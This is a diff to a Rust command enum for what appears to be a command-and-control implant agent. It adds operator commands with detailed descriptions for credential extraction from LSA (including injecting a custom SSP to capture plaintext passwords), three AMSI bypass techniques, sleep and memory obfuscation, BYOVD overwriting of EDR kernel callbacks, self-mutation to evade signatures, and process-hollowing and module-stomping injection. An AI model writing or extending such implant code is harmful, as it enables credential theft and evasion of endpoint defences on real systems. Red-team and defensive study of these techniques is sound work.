@@ -472,6 +472,12 @@ pub enum Command {
     MorphNow {
         seed: u64,
     },
+    /// Switch the sleep obfuscation variant at runtime.  Accepted values:
+    /// `"cronus"` (waitable-timer-based) or `"ekko"` (NtDelayExecution-based).
+    /// The change takes effect on the next sleep cycle.
+    SetSleepVariant {
+        variant: String,
+    },
     /// Return a JSON array of metadata for all loaded plugins.
     ListPlugins,
     /// Remove a plugin from the loaded-plugin registry and release its resources.
@@ -753,6 +759,27 @@ pub enum Command {
     /// (plaintext), Kerberos tickets, DPAPI backup keys, and DCC2 hashes.
     HarvestLSASS,
 
+    // ── LSA Whisperer — SSP interface credential extraction (Windows) ─
+
+    /// Extract credentials by interacting with LSA authentication packages
+    /// (SSPs) through their documented interfaces.  Operates entirely within
+    /// the LSA process's own security context without reading LSASS memory.
+    /// Bypasses Credential Guard and RunAsPPL.  Three methods:
+    /// - `Untrusted`: LsaConnectUntrusted (no admin required)
+    /// - `SspInject`: Inject custom SSP to capture future logons (admin)
+    /// - `Auto`: Try SspInject if elevated, else Untrusted
+    HarvestLSA {
+        method: LsaMethod,
+    },
+
+    /// Return a JSON status snapshot of the LSA Whisperer subsystem:
+    /// active method, credentials buffered, SSP injection state, etc.
+    LSAWhispererStatus,
+
+    /// Stop the LSA Whisperer: cancel any in-progress SSP enumeration,
+    /// unload injected SSP (if any), and clear the credential buffer.
+    LSAWhispererStop,
+
     // ── NTDLL unhooking (Windows) ──────────────────────────────────────
 
     /// Re-fetch a clean copy of ntdll.dll from \KnownDlls (or disk fallback)
@@ -760,6 +787,130 @@ pub enum Command {
     /// ntdll.  This is the fallback when Halo's Gate fails (all adjacent
     /// syscall stubs are hooked).  Also callable on-demand by the operator.
     UnhookNtdll,
+
+    // ── AMSI bypass mode selection (Windows) ───────────────────────────
+
+    /// Switch the active AMSI bypass strategy at runtime.  The agent will
+    /// disable any running bypass and activate the selected one.
+    AmsiBypassMode {
+        mode: AmsiBypassMode,
+    },
+
+    // ── Evanesco continuous memory hiding (Windows) ────────────────────
+
+    /// Return a JSON status snapshot of the Evanesco page-tracker subsystem:
+    /// number of tracked pages, current counts by state (encrypted / decrypted),
+    /// idle threshold, scan interval, and total encrypt/decrypt call counts.
+    /// Only available when the `evanesco` feature is compiled in.
+    EvanescoStatus,
+    /// Dynamically adjust the idle threshold (in milliseconds) for the
+    /// Evanesco background re-encryption thread.  Pages idle longer than
+    /// this value are re-encrypted to `PAGE_NOACCESS`.
+    EvanescoSetThreshold {
+        idle_ms: u64,
+    },
+
+    // ── Kernel callback overwrite (BYOVD, Windows only) ───────────────
+
+    /// Discover and report all registered EDR kernel callbacks: process
+    /// creation, thread creation, image load, and object manager callbacks.
+    /// Returns a JSON array of discovered callbacks with module, address,
+    /// and callback block information.
+    KernelCallbackScan,
+
+    /// Deploy a vulnerable signed driver (BYOVD), locate EDR kernel callbacks,
+    /// and surgically overwrite their function pointers to point to a `ret`
+    /// instruction.  The pointer remains non-NULL, defeating EDR integrity
+    /// checks, but the callback immediately returns without executing.
+    /// Optional `drivers` list restricts which vulnerable drivers to attempt;
+    /// empty vector means try all embedded drivers.
+    KernelCallbackNuke {
+        #[serde(default)]
+        drivers: Vec<String>,
+    },
+
+    /// Restore all previously overwritten kernel callback pointers to their
+    /// original values (from the saved backup).  Requires a prior successful
+    /// `KernelCallbackNuke` operation in the current session.
+    KernelCallbackRestore,
+
+    // ── EDR bypass transformation engine ────────────────────────────────
+
+    /// Scan the agent's own `.text` section for byte signatures known to be
+    /// detected by EDR (YARA rules, entropy heuristics, known gadget chains
+    /// like direct syscall stubs).  Returns a JSON array of `SignatureHit`
+    /// objects describing each detected pattern with offset, signature name,
+    /// and surrounding context bytes.
+    EvasionTransformScan,
+
+    /// Run one cycle of the automated EDR bypass transformation engine.
+    /// Scans `.text` for known signatures and applies up to
+    /// `max_transforms_per_cycle` semantic-preserving transformations
+    /// (instruction substitution, register reassignment, nop sled insertion,
+    /// constant splitting, jump obfuscation).  Returns a JSON summary of
+    /// applied transforms with before/after hashes for verification.
+    EvasionTransformRun,
+
+    /// Perform NTFS transaction-based process hollowing injection.
+    /// Creates an NTFS transaction, creates a section backed by the
+    /// transaction, writes the payload into a suspended target process,
+    /// then rolls back the transaction so the on-disk file never existed.
+    /// The section mapping in the target process remains valid.
+    /// Includes ETW blinding with spoofed provider GUIDs.
+    /// Returns `InjectionResult` on success.
+    TransactedHollow {
+        /// Process name to inject into (e.g. `"svchost.exe"`).
+        target_process: String,
+        /// Shellcode or PE payload bytes.
+        payload: Vec<u8>,
+        /// Whether to perform ETW blinding before injection.
+        etw_blinding: bool,
+    },
+
+    /// Delayed module-stomp injection: load a sacrificial DLL into the
+    /// target process, wait for the EDR initial-scan window to pass,
+    /// then overwrite the DLL's `.text` section with the payload.
+    /// The delay (8–15 seconds randomized by default) defeats timing-
+    /// based EDR heuristics that flag modules whose code changes shortly
+    /// after loading.  Phase 1 (load) returns immediately; Phase 2
+    /// (stomp + execute) fires after the delay.
+    /// Returns a phase-1 acknowledgement immediately, then a second
+    /// `InjectionResult` when phase 2 completes.
+    DelayedStomp {
+        /// Target process ID.
+        target_pid: u32,
+        /// Shellcode or PE payload bytes.
+        payload: Vec<u8>,
+        /// Optional override for the delay in seconds (uses config default if `None`).
+        delay_secs: Option<u32>,
+    },
+}
+
+/// AMSI bypass strategy selector.
+///
+/// Controls which bypass technique the agent uses to neutralise Anti-Malware
+/// Scan Interface scanning.  Each strategy has different OPSEC tradeoffs:
+///
+/// - **WriteRaid**: Data-only race condition — overwrites the AMSI init-failed
+///   flag in `.data` so all subsequent scans return `AMSI_RESULT_CLEAN`.
+///   No code patches, no hardware breakpoints, no `VirtualProtect` calls.
+///   **Most stealthy**; preferred when available.
+/// - **Hwbp**: Hardware breakpoint on `AmsiScanBuffer` via DR0/DR1 + VEH.
+///   No `.text` modification, but breakpoint registers are monitorable.
+/// - **MemoryPatch**: In-process code patch (`xor eax,eax; ret`).  Detectable
+///   via code integrity checks and `VirtualProtect` hooks.
+/// - **Auto**: Select the best available strategy (WriteRaid > Hwbp > MemoryPatch).
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum AmsiBypassMode {
+    /// Hardware-breakpoint bypass via DR0/DR1 + VEH handler.
+    Hwbp,
+    /// In-process code patching of AmsiScanBuffer.
+    MemoryPatch,
+    /// Data-only race condition: overwrite AmsiInitFailed flag.
+    WriteRaid,
+    /// Automatically select the best available strategy.
+    Auto,
 }
 
 /// Browser selector for the [`Command::BrowserData`] command.
@@ -779,6 +930,30 @@ pub enum BrowserDataType {
     Credentials,
     Cookies,
     All,
+}
+
+/// LSA Whisperer method selector.
+///
+/// Controls how the LSA Whisperer extracts credentials from LSA authentication
+/// packages.  Each method has different privilege requirements and OPSEC profiles:
+///
+/// - **Untrusted**: Uses `LsaConnectUntrusted` + `LsaCallAuthenticationPackage`
+///   to query already-loaded SSPs (MSV1_0, Kerberos, WDigest).  No admin
+///   privileges required — any process can connect to LSA.
+/// - **SspInject**: Adds a custom SSP via registry that receives ALL
+///   authentication events, including plaintext passwords during future logons.
+///   Requires admin privileges.  Credentials are buffered in an encrypted ring.
+/// - **Auto**: Try `SspInject` if the agent is elevated (or has a SYSTEM token),
+///   else fall back to `Untrusted`.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum LsaMethod {
+    /// Query already-loaded SSPs via LsaConnectUntrusted (no admin required).
+    Untrusted,
+    /// Inject a custom SSP to capture future authentication events (admin).
+    SspInject,
+    /// Automatically select the best available method.
+    Auto,
 }
 
 /// Errors produced by [`CryptoSession`].
